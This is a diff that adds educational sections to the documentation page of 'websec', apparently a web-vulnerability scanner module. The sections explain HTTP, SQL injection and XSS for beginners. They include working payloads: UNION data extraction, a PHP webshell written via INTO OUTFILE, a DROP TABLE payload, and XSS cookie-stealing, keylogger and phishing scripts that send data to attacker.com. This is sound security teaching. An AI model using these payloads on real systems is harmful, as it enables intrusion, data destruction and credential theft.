@@ -254,6 +254,14 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
         <li><div class="sidebar-sep">More</div></li>
         <li><a href="#examples">Examples</a></li>
         <li><a href="#notes">Notes</a></li>
+        <li><div class="sidebar-sep">Internals</div></li>
+        <li><a href="#arch-deep-dive">Architecture</a></li>
+        <li><a href="#http-bytes">HTTP Bytes</a></li>
+        <li><a href="#sqli-internals">SQLi Internals</a></li>
+        <li><a href="#xss-internals">XSS Internals</a></li>
+        <li><a href="#websec-customization">Customization</a></li>
+        <li><div class="sidebar-sep">Study</div></li>
+        <li><a href="#learning-path">Learning Path</a></li>
         <li><a href="#author">Author</a></li>
       </ul>
     </aside>
@@ -261,6 +269,47 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
     <div class="content">
 
       <!-- Overview -->
+            <!-- ═══════════════════════════════════════════════════════
+           BEGINNER STARTUP — read foundations.html first
+           ═══════════════════════════════════════════════════════ -->
+      <div id="beginner-startup" style="background:linear-gradient(135deg,#0d2018,#111a15);border:2px solid rgba(74,222,128,0.35);border-radius:12px;padding:1.6rem 2rem;margin-bottom:2.5rem">
+        <div style="display:flex;align-items:center;gap:0.8rem;margin-bottom:1rem">
+          <div style="width:32px;height:32px;background:#1a4a2e;border:1px solid rgba(74,222,128,0.4);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+          </div>
+          <div>
+            <div style="font-size:0.48rem;letter-spacing:0.22em;text-transform:uppercase;color:rgba(74,222,128,0.7)">Beginner Startup</div>
+            <div style="font-size:0.72rem;font-weight:700;color:#f0ede6">New to secV or websec? Start here.</div>
+          </div>
+          <a href="../foundations.html" style="margin-left:auto;font-size:0.52rem;color:#4ade80;text-decoration:none;border:1px solid rgba(74,222,128,0.35);padding:0.3rem 0.7rem;border-radius:5px;white-space:nowrap" onmouseover="this.style.background='rgba(74,222,128,0.1)'" onmouseout="this.style.background='transparent'">Foundations guide &rarr;</a>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:0.8rem;margin-bottom:1.2rem">
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">What you need first</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9"><li>▸ A web application URL you own or have permission to test</li>
+<li>▸ <code>python3-requests</code> and <code>python3-bs4</code> installed</li>
+<li>▸ Burp Suite (optional) for proxy integration</li></ul>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Your first safe command</div>
+            <pre style="font-size:0.58rem;color:#9a9a9a;line-height:1.7;margin:0;white-space:pre-wrap">set target http://testphp.vulnweb.com
+set operation scan
+run</pre>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Operations by difficulty</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li><span style="color:#4ade80">&bull;</span> <strong style="color:#bbb">Easy:</strong> scan, header_check, robots_enum</li>
+              <li><span style="color:#fbbf24">&bull;</span> <strong style="color:#bbb">Medium:</strong> sqli_test, xss_probe, auth_bypass</li>
+              <li><span style="color:#f87171">&bull;</span> <strong style="color:#bbb">Advanced:</strong> full_audit, cms_exploit, api_fuzz</li>
+            </ul>
+          </div>
+        </div>
+        <div style="font-size:0.58rem;color:#555;border-top:1px solid rgba(255,255,255,0.06);padding-top:0.8rem">
+          <strong style="color:#888">Key terms:</strong> <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">SQLi</a> — SQL Injection — injecting SQL commands into input fields &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">XSS</a> — Cross-Site Scripting — injecting JavaScript into web pages &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">SSRF</a> — Server-Side Request Forgery — making the server fetch internal URLs &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">OWASP Top 10</a> — The ten most critical web security risks
+          &nbsp;&mdash;&nbsp;<a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Full glossary &rarr;</a>
+        </div>
+      </div>
       <section id="overview">
         <p class="sec-label">Overview</p>
         <h2>What websec does</h2>
@@ -937,6 +986,635 @@ secV (websec) ❯ <span class="kw">run</span> https://target.com</code></pre>
         <p><strong>Stealth + delay:</strong> <code>delay</code> and <code>jitter</code> add sleep time before every request — including multi-threaded directory brute-force. Reduce <code>threads</code> when using delay to avoid the delay being applied concurrently rather than sequentially.</p>
         <p><strong>SOCKS5 proxy</strong> (Tor) requires <code>requests[socks]</code>: <code>pip3 install requests[socks]</code>. HTTP proxies work with the standard requests install.</p>
         <p><code>waf_evasion</code> roughly doubles the number of SQLi and XSS payloads tested. Expect proportionally longer runtime.</p>
+      </section>
+
+      <!-- ══════════ ARCHITECTURE DEEP DIVE ══════════ -->
+      <section id="arch-deep-dive">
+        <p class="sec-label">Internals</p>
+        <h2>Architecture Deep Dive</h2>
+        <p>
+          This chapter explains HTTP at the byte level, how SQL injection payloads work inside the
+          database's query parser, how XSS escaping (and unescaping) works, and how to add your own
+          attack modules to websec.
+        </p>
+      </section>
+
+      <section id="http-bytes">
+        <p class="sec-label">Internals</p>
+        <h2>HTTP Request — Byte Anatomy</h2>
+        <p>
+          HTTP/1.1 is a plain-text protocol. Every byte you send is visible on the wire (before TLS).
+          Understanding the exact byte format lets you craft custom headers, bypass WAFs, and understand
+          what websec is sending during its vulnerability scans.
+        </p>
+        <pre><code><span class="comment">## HTTP/1.1 Request — exact bytes on the wire</span>
+POST /login HTTP/1.1\r\n
+Host: target.com\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 27\r\n
+Cookie: session=abc123def456\r\n
+User-Agent: Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36\r\n
+\r\n
+username=admin&password=test
+
+<span class="comment">## Byte breakdown:</span>
+50 4F 53 54  = "POST"
+20           = space
+2F 6C 6F 67 69 6E = "/login"
+20           = space
+48 54 54 50 2F 31 2E 31 = "HTTP/1.1"
+0D 0A        = \r\n (CRLF — mandatory line ending in HTTP)
+
+<span class="comment">## Headers end with double CRLF:</span>
+... last-header-value 0D 0A 0D 0A body-starts-here
+
+<span class="comment">## The \r\n vs \n distinction matters for some WAFs:</span>
+<span class="comment">## Some WAF bypass techniques inject \n-only headers to confuse parsers</span></code></pre>
+
+        <h3>HTTP Response Anatomy</h3>
+        <pre><code><span class="comment">## HTTP/1.1 Response</span>
+HTTP/1.1 200 OK\r\n
+Server: nginx/1.24.0\r\n
+Content-Type: text/html; charset=UTF-8\r\n
+Content-Length: 1234\r\n
+Set-Cookie: session=xyz789; HttpOnly; Secure; SameSite=Strict\r\n
+X-Frame-Options: DENY\r\n
+X-Content-Type-Options: nosniff\r\n
+Content-Security-Policy: default-src 'self'\r\n
+\r\n
+&lt;html&gt;...
+
+<span class="comment">## websec parses headers for security analysis:</span>
+<span class="comment">## Missing X-Frame-Options → finding: clickjacking possible</span>
+<span class="comment">## Missing CSP → finding: XSS impact amplified (no restriction on script src)</span>
+<span class="comment">## Missing HSTS → finding: SSL stripping possible on first visit</span>
+<span class="comment">## Server header leaks version → finding: known CVE lookup possible</span></code></pre>
+
+        <h3>URL Encoding — How Characters Become %XX</h3>
+        <pre><code><span class="comment">## URL encoding (percent-encoding) converts unsafe bytes to %HH</span>
+' (apostrophe, ASCII 0x27) → %27
+" (double quote, 0x22)     → %22
+&lt; (less-than, 0x3C)        → %3C
+&gt; (greater-than, 0x3E)     → %3E
+  (space, 0x20)            → %20 or +
+= (equals, 0x3D)           → %3D
+& (ampersand, 0x26)        → %26
+
+<span class="comment">## Why this matters for SQLi: some WAFs block ' but not %27</span>
+<span class="comment">## Double-encode trick: %27 → %2527 (server decodes %25 → %, giving %27 → ')</span>
+<span class="comment">## websec's waf_evasion mode tries both encoded and double-encoded variants</span></code></pre>
+      </section>
+
+      <section id="sqli-internals">
+        <p class="sec-label">Internals</p>
+        <h2>SQL Injection — From Zero to Exploitation</h2>
+        <p>
+          If you've never touched a database before, start here. This section builds from
+          "what is SQL" all the way to extracting data from a compromised database using secV.
+        </p>
+
+        <h3>What is SQL?</h3>
+        <p>
+          <strong>SQL</strong> (Structured Query Language) is the language used to talk to databases.
+          Databases are just organized spreadsheets — tables full of rows and columns. SQL is how
+          you ask questions like "give me all users whose username is admin" or "insert a new row".
+        </p>
+        <pre><code><span class="comment">## Example: a "users" table in a database</span>
+id | username | password (hashed)    | email
+───┼──────────┼──────────────────────┼───────────────
+1  | admin    | $2b$10$xyz...        | admin@site.com
+2  | alice    | $2b$10$abc...        | alice@site.com
+3  | bob      | $2b$10$def...        | bob@site.com
+
+<span class="comment">## SQL query to log in a user:</span>
+SELECT * FROM users WHERE username='admin' AND password='hashed_pw_here'
+
+<span class="comment">## Translation: "Find all rows in the users table where</span>
+<span class="comment">##              the username column equals 'admin'</span>
+<span class="comment">##              AND the password column equals 'hashed_pw_here'"</span>
+
+<span class="comment">## If the query returns 1 or more rows → user exists → login succeeds</span>
+<span class="comment">## If the query returns 0 rows → login fails</span></code></pre>
+
+        <h3>Why Websites Break — String Concatenation</h3>
+        <p>
+          Web applications build SQL queries by combining a template string with user-supplied input.
+          This is the root cause of SQL injection:
+        </p>
+        <pre><code><span class="comment">## A vulnerable login form (PHP/Python — same idea in any language)</span>
+
+<span class="comment">## User types into the login form:</span>
+Username: admin
+Password: mypassword
+
+<span class="comment">## The PHP code builds the query like this:</span>
+$username = $_POST["username"];  <span class="comment"># = "admin" (from the form)</span>
+$password = hash($_POST["password"]);
+
+$sql = "SELECT * FROM users WHERE username='" + $username + "' AND password='" + $password + "'";
+
+<span class="comment">## Result — safe input, safe query:</span>
+SELECT * FROM users WHERE username='admin' AND password='5f4dcc...'
+
+<span class="comment">## Now what if the user types this in the username field?</span>
+Username: admin'--
+Password: (anything)
+
+<span class="comment">## The query becomes:</span>
+SELECT * FROM users WHERE username='admin'--' AND password='...'
+<span class="comment">#                                        ^^ comment! SQL ignores everything after --</span>
+
+<span class="comment">## The database sees:</span>
+SELECT * FROM users WHERE username='admin'
+<span class="comment">## No password check! The attacker just logged in as admin without knowing the password.</span></code></pre>
+
+        <h3>What Just Happened — The SQL Comment Trick</h3>
+        <p>
+          The single quote <code>'</code> inside the username <em>closed</em> the string that the
+          developer opened with <code>username='</code>. The two dashes <code>--</code> are a SQL
+          comment — everything after them on that line is ignored by the database. The developer's
+          password check was commented out.
+        </p>
+        <p>
+          This is SQL injection: user input that <em>changes the structure of the SQL query</em>.
+          The developer intended the apostrophes to be data. The attacker's input turned them into
+          SQL syntax.
+        </p>
+
+        <h3>Building an Attack Surface — Types of SQLi</h3>
+        <pre><code><span class="comment">## Type 1: Error-Based SQLi (most obvious — database errors visible)</span>
+<span class="comment">## Payload: force the database to produce an error that leaks data</span>
+' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
+
+<span class="comment">## MSSQL converts the table name (a string) to int → fails → error message shows the string:</span>
+<span class="comment">## "Conversion failed when converting the varchar value 'users' to data type int."</span>
+<span class="comment">## You just learned a table is called 'users' from an error message.</span>
+
+<span class="comment">## Type 2: UNION-Based SQLi (most powerful — returns data in response)</span>
+<span class="comment">## Payload: append a second SELECT that returns data you choose</span>
+' UNION SELECT username, password, 3, 4 FROM users--
+
+<span class="comment">## The UNION rule: both SELECT statements must return the SAME number of columns</span>
+<span class="comment">## First, find column count with: ' UNION SELECT NULL,NULL,NULL-- (add NULLs until no error)</span>
+<span class="comment">## Then replace NULLs with real column names to extract data</span>
+
+<span class="comment">## Type 3: Boolean-Based Blind SQLi (no data returned — infer from true/false responses)</span>
+' AND 1=1--    <span class="comment"># true condition  → page loads normally</span>
+' AND 1=2--    <span class="comment"># false condition → page behaves differently (error, empty, redirect)</span>
+<span class="comment">## Use the difference to ask yes/no questions about data:</span>
+' AND SUBSTRING(username,1,1)='a'--   <span class="comment"># does admin's username start with 'a'?</span>
+
+<span class="comment">## Type 4: Time-Based Blind SQLi (no visual difference — use response delay)</span>
+' AND IF(1=1, SLEEP(3), 0)--   <span class="comment"># always sleeps 3 seconds (confirm injection)</span>
+' AND IF(SUBSTRING(username,1,1)='a', SLEEP(3), 0)--  <span class="comment"># sleeps if first char is 'a'</span>
+<span class="comment">## Extract data one character at a time using timing</span>
+
+<span class="comment">## Type 5: Out-of-Band SQLi (exfiltrate via DNS or HTTP — bypasses monitoring)</span>
+'; EXEC master..xp_cmdshell 'nslookup $(SELECT TOP 1 username FROM users).attacker.com'--
+<span class="comment">## Database makes DNS query: admin.attacker.com → attacker sees it in DNS logs</span>
+<span class="comment">## Requires xp_cmdshell enabled on MSSQL (rare, but happens on old systems)</span></code></pre>
+
+        <h3>How websec Detects SQLi</h3>
+        <pre><code><span class="comment">## websec's detection logic (simplified)</span>
+
+<span class="comment">## Step 1: find injection points — any user input that goes to server</span>
+injection_points = []
+for param in request.GET | request.POST | request.COOKIES:
+    injection_points.append(param)
+<span class="comment">## Also: HTTP headers (User-Agent, Referer, X-Forwarded-For are often injectable)</span>
+
+<span class="comment">## Step 2: test each injection point with error-triggering payloads</span>
+ERROR_PAYLOADS = ["'", "''", "`", "1'1", "1\"1"]
+for payload in ERROR_PAYLOADS:
+    response = session.get(url, params={param: payload})
+    <span class="comment">## Check for database error signatures in response:</span>
+    ERROR_SIGS = ["SQL syntax", "ORA-", "mysql_fetch", "SQLSTATE",
+                  "Unclosed quotation mark", "syntax error"]
+    if any(sig in response.text for sig in ERROR_SIGS):
+        findings.append({"type": "sqli_error", "param": param, "evidence": ...})
+
+<span class="comment">## Step 3: confirm with boolean test</span>
+resp_true  = session.get(url, params={param: "1 AND 1=1--"})
+resp_false = session.get(url, params={param: "1 AND 1=2--"})
+if len(resp_true.text) != len(resp_false.text):
+    findings.append({"type": "sqli_boolean", "param": param})
+
+<span class="comment">## Step 4: confirm with timing test</span>
+import time
+start = time.time()
+session.get(url, params={param: "1 AND SLEEP(3)--"})
+elapsed = time.time() - start
+if elapsed &gt; 2.5:
+    findings.append({"type": "sqli_time", "param": param})</code></pre>
+
+        <h3>SQLi Attack Surface — What Can You Access?</h3>
+        <pre><code><span class="comment">## Once you have SQLi, here's what you can enumerate (MySQL example)</span>
+
+<span class="comment">## 1. List all databases:</span>
+' UNION SELECT schema_name,2,3 FROM information_schema.schemata--
+
+<span class="comment">## 2. List tables in current database:</span>
+' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
+
+<span class="comment">## 3. List columns in users table:</span>
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
+
+<span class="comment">## 4. Extract all usernames and passwords:</span>
+' UNION SELECT username,password,3 FROM users--
+
+<span class="comment">## 5. Read files from disk (requires FILE privilege):</span>
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
+
+<span class="comment">## 6. Write a webshell to disk (requires write permission + outfile perm):</span>
+' UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;",2,3 INTO OUTFILE '/var/www/html/shell.php'--
+<span class="comment">## If this works: visit http://target.com/shell.php?cmd=id → RCE</span>
+
+<span class="comment">## How secV uses this: set operation sqli; websec auto-runs steps 1-4</span>
+<span class="comment">## and formats output into structured findings for the GUI</span></code></pre>
+
+        <h3>SQL Injection — Inside the Database Parser</h3>
+        <p>
+          SQL injection works because web applications concatenate user input directly into SQL query
+          strings. The database server then parses the combined string as valid SQL. Understanding
+          how each database's SQL parser interprets the injected bytes is the key to reliable exploitation.
+        </p>
+
+        <h3>How a Vulnerable Query is Parsed</h3>
+        <pre><code><span class="comment">## Vulnerable PHP code:</span>
+$sql = "SELECT * FROM users WHERE username='" . $_GET['user'] . "' AND active=1";
+
+<span class="comment">## Normal input: user=admin</span>
+SELECT * FROM users WHERE username='admin' AND active=1
+
+<span class="comment">## Injection: user=admin'--</span>
+SELECT * FROM users WHERE username='admin'--' AND active=1
+<span class="comment">#                                         ↑ closes the string literal</span>
+<span class="comment">#                                          ↑↑ SQL comment — everything after ignored</span>
+<span class="comment">## Result: queries users table where username='admin' — ignores password/active check</span>
+
+<span class="comment">## UNION injection: user=x' UNION SELECT username,password,3 FROM users--</span>
+SELECT * FROM users WHERE username='x'
+UNION
+SELECT username,password,3 FROM users--' AND active=1
+<span class="comment">## Result: returns all usernames+passwords from users table alongside the normal query</span></code></pre>
+
+        <h3>Database-Specific Comment Syntax</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Database</th><th>Line comment</th><th>Block comment</th><th>Stacked queries?</th></tr></thead>
+          <tbody>
+            <tr><td>MySQL / MariaDB</td><td><code>-- </code> (note trailing space) or <code>#</code></td><td><code>/* ... */</code></td><td>Only via multi-statement if allowed</td></tr>
+            <tr><td>PostgreSQL</td><td><code>--</code></td><td><code>/* ... */</code></td><td>Yes (;)</td></tr>
+            <tr><td>SQLite</td><td><code>--</code></td><td><code>/* ... */</code></td><td>Yes (;)</td></tr>
+            <tr><td>MSSQL</td><td><code>--</code></td><td><code>/* ... */</code></td><td>Yes (;)</td></tr>
+            <tr><td>Oracle</td><td><code>--</code></td><td><code>/* ... */</code></td><td>No (use PL/SQL blocks)</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Time-Based Blind SQLi — Byte Level</h3>
+        <pre><code><span class="comment">## Blind SQLi: no data returned in response — use timing to extract data bit by bit</span>
+
+<span class="comment">## MySQL time-based payload:</span>
+user=admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0)--
+
+<span class="comment">## What the database executes:</span>
+SELECT * FROM users WHERE username='admin'
+AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0)--'
+
+<span class="comment">## If first char of password is 'a': database waits 3 seconds → response delayed</span>
+<span class="comment">## If not: immediate response</span>
+<span class="comment">## websec measures response time: &gt;2.5 seconds = true condition</span>
+
+<span class="comment">## Extract full value: binary search by ASCII code</span>
+<span class="comment">## Round 1: IF(ASCII(SUBSTR(pw,1,1))&gt;127, SLEEP(3), 0)  → fast → ≤127</span>
+<span class="comment">## Round 2: IF(ASCII(SUBSTR(pw,1,1))&gt;64,  SLEEP(3), 0)  → slow → &gt;64 (so 65-127)</span>
+<span class="comment">## Round 3: IF(ASCII(SUBSTR(pw,1,1))&gt;96,  SLEEP(3), 0)  → slow → &gt;96 (97-127)</span>
+<span class="comment">## ... 7 rounds per character = O(log2(256)) = 8 requests per byte</span>
+<span class="comment">## websec's auto-extract: ~8 requests × 32 chars = ~256 requests for a 32-char hash</span></code></pre>
+
+        <h3>websec's Internal Payload Generation</h3>
+        <pre><code><span class="comment"># websec generates payloads from a structured template + waf_evasion mutations</span>
+
+BASE_SQLI_PAYLOADS = [
+    "'",              <span class="comment"># syntax error test</span>
+    "''",             <span class="comment"># double quote test</span>
+    "1 OR 1=1--",     <span class="comment"># boolean bypass</span>
+    "1' OR '1'='1",   <span class="comment"># alternate quoting</span>
+    "1 AND SLEEP(3)--", <span class="comment"># time-based detection</span>
+    "1; DROP TABLE users--",  <span class="comment"># stacked query (mssql/pgsql)</span>
+    "1 UNION SELECT NULL--",  <span class="comment"># UNION detection</span>
+]
+
+WAF_MUTATIONS = {
+    "case":     lambda p: p.upper(),
+    "comments": lambda p: p.replace(" ", "/**/"),
+    "encode":   lambda p: quote(p),
+    "double_encode": lambda p: quote(quote(p)),
+    "concat":   lambda p: p.replace("'", "CHAR(39)"),
+}
+
+def generate_payloads(base: list, waf_evasion: bool) -&gt; list:
+    payloads = list(base)
+    if waf_evasion:
+        for p in base:
+            for name, mutate in WAF_MUTATIONS.items():
+                payloads.append(mutate(p))
+    return payloads</code></pre>
+      </section>
+
+      <section id="xss-internals">
+        <p class="sec-label">Internals</p>
+        <h2>Cross-Site Scripting (XSS) — From Zero to Attack</h2>
+        <p>
+          Start here if you've never seen an XSS attack before. We'll go from "what is HTML" to
+          stealing session cookies in a browser.
+        </p>
+
+        <h3>What is HTML and Why Can It Be Dangerous?</h3>
+        <p>
+          HTML (HyperText Markup Language) is the language browsers render into web pages. When a
+          browser loads a page it processes HTML tags as instructions: <code>&lt;b&gt;</code> makes
+          text bold, <code>&lt;img src="..."&gt;</code> loads an image, <code>&lt;script&gt;</code>
+          runs JavaScript code. The problem: browsers can't tell the difference between HTML/JS that
+          the developer intentionally wrote and HTML/JS that an attacker smuggled in via user input.
+        </p>
+        <pre><code><span class="comment">## Normal page — developer writes a greeting message:</span>
+&lt;p&gt;Welcome back, John!&lt;/p&gt;
+
+<span class="comment">## Vulnerable page — developer puts username from URL directly into HTML:</span>
+&lt;p&gt;Welcome back, {username_from_url}!&lt;/p&gt;
+
+<span class="comment">## Attacker's URL:</span>
+https://site.com/profile?name=&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+<span class="comment">## Page rendered by browser:</span>
+&lt;p&gt;Welcome back, &lt;script&gt;alert('XSS')&lt;/script&gt;!&lt;/p&gt;
+<span class="comment">##                ↑ browser sees this as a script tag and RUNS IT</span>
+<span class="comment">## Result: alert box pops up — attacker controls JavaScript execution on the page</span></code></pre>
+
+        <h3>Why XSS Matters — What JavaScript Can Do</h3>
+        <p>
+          JavaScript running in a browser has almost full access to that page's context:
+        </p>
+        <pre><code><span class="comment">## Cookie theft — the most common XSS payload</span>
+&lt;script&gt;
+  new Image().src = "https://attacker.com/steal?c=" + document.cookie;
+&lt;/script&gt;
+<span class="comment">## Victim's browser makes a GET request to attacker.com with the victim's cookies</span>
+<span class="comment">## Attacker sees in their server log: /steal?c=session=abc123def456</span>
+<span class="comment">## Attacker sets that cookie in their browser → they ARE the victim on the site</span>
+
+<span class="comment">## Keylogger — capture everything the victim types</span>
+&lt;script&gt;
+  document.addEventListener('keydown', function(e) {
+    new Image().src = "https://attacker.com/keys?k=" + e.key;
+  });
+&lt;/script&gt;
+
+<span class="comment">## Fake login form overlay — credential phishing</span>
+&lt;script&gt;
+  document.body.innerHTML = '&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff"&gt;' +
+    '&lt;form action="https://attacker.com/phish"&gt;' +
+    '&lt;input name="user"&gt;&lt;input type="password" name="pass"&gt;&lt;button&gt;Login&lt;/button&gt;' +
+    '&lt;/form&gt;&lt;/div&gt;';
+&lt;/script&gt;
+<span class="comment">## Victim thinks they're logging into the real site — credentials go to attacker</span>
+
+<span class="comment">## Redirect to malware download</span>
+&lt;script&gt;window.location = "https://attacker.com/malware.exe";&lt;/script&gt;</code></pre>
+
+        <h3>The Three Types of XSS</h3>
+        <pre><code><span class="comment">## Type 1: Reflected XSS — payload is in the URL, runs once</span>
+https://site.com/search?q=&lt;script&gt;steal_cookies()&lt;/script&gt;
+<span class="comment">## The page "reflects" the search term back into HTML without escaping</span>
+<span class="comment">## Attack: send this URL to victim via email/Slack/SMS</span>
+<span class="comment">## When victim clicks: their browser runs the script in the context of site.com</span>
+
+<span class="comment">## Type 2: Stored XSS (Persistent) — payload saved in database, runs for every visitor</span>
+<span class="comment">## Attacker posts a comment on a blog:</span>
+Comment: &lt;script&gt;steal_cookies()&lt;/script&gt;
+<span class="comment">## Database stores this literally. Every user who loads the page with this comment</span>
+<span class="comment">## gets their cookies stolen. Most dangerous type — one post, infinite victims.</span>
+
+<span class="comment">## Type 3: DOM-Based XSS — payload never hits the server, JS processes it client-side</span>
+https://site.com/page#&lt;img src=x onerror=alert(1)&gt;
+<span class="comment">## The # fragment is not sent to the server</span>
+<span class="comment">## Vulnerable JS reads location.hash and inserts it into innerHTML:</span>
+document.getElementById('content').innerHTML = location.hash.substring(1);
+<span class="comment">## Browser processes the fragment — XSS fires entirely on the client</span></code></pre>
+
+        <h3>XSS — Encoding, Contexts, and Bypass</h3>
+        <p>
+          Cross-Site Scripting works when user input is reflected into an HTML page without proper
+          escaping. The injection context (HTML body, attribute, JS, URL) determines which encoding
+          bypass works.
+        </p>
+        <pre><code><span class="comment">## Context 1: HTML body injection</span>
+&lt;p&gt;Welcome, USERINPUT&lt;/p&gt;
+
+Payload: &lt;script&gt;alert(1)&lt;/script&gt;
+Result:  &lt;p&gt;Welcome, &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;   ← XSS fires
+
+<span class="comment">## Context 2: HTML attribute injection</span>
+&lt;input value="USERINPUT"&gt;
+
+Payload: " onmouseover="alert(1)
+Result:  &lt;input value="" onmouseover="alert(1)"&gt;   ← event handler injected
+
+<span class="comment">## Context 3: JavaScript string injection</span>
+&lt;script&gt;var name = "USERINPUT";&lt;/script&gt;
+
+Payload: ";alert(1)//
+Result:  &lt;script&gt;var name = "";alert(1)//";&lt;/script&gt;   ← JS alert fires
+
+<span class="comment">## Context 4: URL parameter reflected into href</span>
+&lt;a href="USERINPUT"&gt;click&lt;/a&gt;
+
+Payload: javascript:alert(1)
+Result:  &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;   ← fires on click</code></pre>
+
+        <h3>HTML Entity Bypass Techniques</h3>
+        <pre><code><span class="comment">## If &lt; and &gt; are entity-encoded (&amp;lt; &amp;gt;), try attribute context:</span>
+Payload: " autofocus onfocus="alert(1)
+<span class="comment">## &lt; and &gt; not needed — attribute injected without tags</span>
+
+<span class="comment">## If quotes are blocked, try without:</span>
+&lt;img src=x onerror=alert(1)&gt;
+<span class="comment">## HTML5 allows unquoted attribute values — no quotes needed</span>
+
+<span class="comment">## HTML entity encoding of the payload (to bypass input filters):</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+Decimal:  &amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;
+Hex:      &amp;#x3C;script&amp;#x3E;alert(1)&amp;#x3C;/script&amp;#x3E;
+<span class="comment">## Browser decodes entities before rendering — may bypass input filter that blocks raw &lt;&gt;</span>
+
+<span class="comment">## JavaScript unicode escape:</span>
+<script>alert(1)</script>
+<span class="comment">## Works inside JS string context: JS engine decodes \uXXXX before executing</span></code></pre>
+
+        <h3>Content Security Policy — What Stops XSS</h3>
+        <pre><code><span class="comment">## Strong CSP prevents XSS execution even if injection succeeds:</span>
+Content-Security-Policy: default-src 'self'; script-src 'nonce-ABC123'; object-src 'none'
+
+<span class="comment">## 'nonce-ABC123': only &lt;script nonce="ABC123"&gt; tags execute</span>
+<span class="comment">## Injected &lt;script&gt; without nonce = blocked by browser</span>
+<span class="comment">## websec reports missing/weak CSP as a HIGH finding:</span>
+missing:        no CSP header at all
+unsafe-inline:  script-src 'unsafe-inline' → any inline script runs (XSS possible)
+unsafe-eval:    script-src 'unsafe-eval' → eval() / Function() work → XSS amplified
+wildcard:       script-src * → any external source allowed</code></pre>
+      </section>
+
+      <section id="websec-customization">
+        <p class="sec-label">Extend</p>
+        <h2>Customization &amp; Extension</h2>
+
+        <h3>Adding a Custom Vulnerability Scanner</h3>
+        <pre><code><span class="comment"># websec.py — add to SCANNERS dict</span>
+def scan_graphql_introspection(url: str, session: requests.Session, params: dict) -&gt; list:
+    """Detect exposed GraphQL introspection (leaks full API schema)."""
+    findings = []
+    gql_endpoints = ["/graphql", "/api/graphql", "/gql", "/v1/graphql"]
+
+    introspection_query = '''
+    {"query": "{__schema{types{name}}}"}
+    '''
+
+    for ep in gql_endpoints:
+        target = url.rstrip("/") + ep
+        try:
+            r = session.post(target, json={"query": "{__schema{types{name}}}"},
+                             timeout=params.get("timeout", 10))
+            if r.status_code == 200 and "__schema" in r.text:
+                findings.append({
+                    "type": "graphql_introspection",
+                    "url": target,
+                    "severity": "MEDIUM",
+                    "description": "GraphQL introspection enabled — full API schema exposed",
+                    "evidence": r.text[:200],
+                })
+        except Exception:
+            continue
+
+    return findings
+
+SCANNERS = {
+    "sqli":          scan_sqli,            <span class="comment"># existing</span>
+    "xss":           scan_xss,             <span class="comment"># existing</span>
+    "graphql":       scan_graphql_introspection,  <span class="comment"># yours</span>
+}
+
+<span class="comment"># Usage: set operation scan; set check_graphql true; run &lt;url&gt;</span></code></pre>
+
+        <h3>Adding a Custom WAF Bypass Header Set</h3>
+        <pre><code><span class="comment"># Headers that some WAFs pass to the backend without inspection</span>
+BYPASS_HEADERS = {
+    "X-Forwarded-For": "127.0.0.1",
+    "X-Real-IP":       "127.0.0.1",
+    "X-Originating-IP": "127.0.0.1",
+    "X-Remote-IP":     "127.0.0.1",
+    "X-Remote-Addr":   "127.0.0.1",
+    "X-Custom-IP-Authorization": "127.0.0.1",
+    "X-Forwarded-Host": "localhost",
+    "X-Host":          "localhost",
+    "X-ProxyUser-IP":  "127.0.0.1",
+    <span class="comment"># Some WAFs allow requests that appear to come from the server's own IP</span>
+}
+
+<span class="comment"># Inject into websec session:</span>
+session = requests.Session()
+session.headers.update(BYPASS_HEADERS)
+<span class="comment"># Now all requests carry these headers — useful for testing 403 bypass</span></code></pre>
+      </section>
+
+      <!-- ══════════ LEARNING PATH ══════════ -->
+      <section id="learning-path">
+        <p class="sec-label">Study</p>
+        <h2>Learning Path &amp; Resources</h2>
+        <p>
+          Use these resources to go deeper on every concept websec touches.
+          The path below is ordered — start at the top if you're new, skip ahead if you already have the foundation.
+        </p>
+
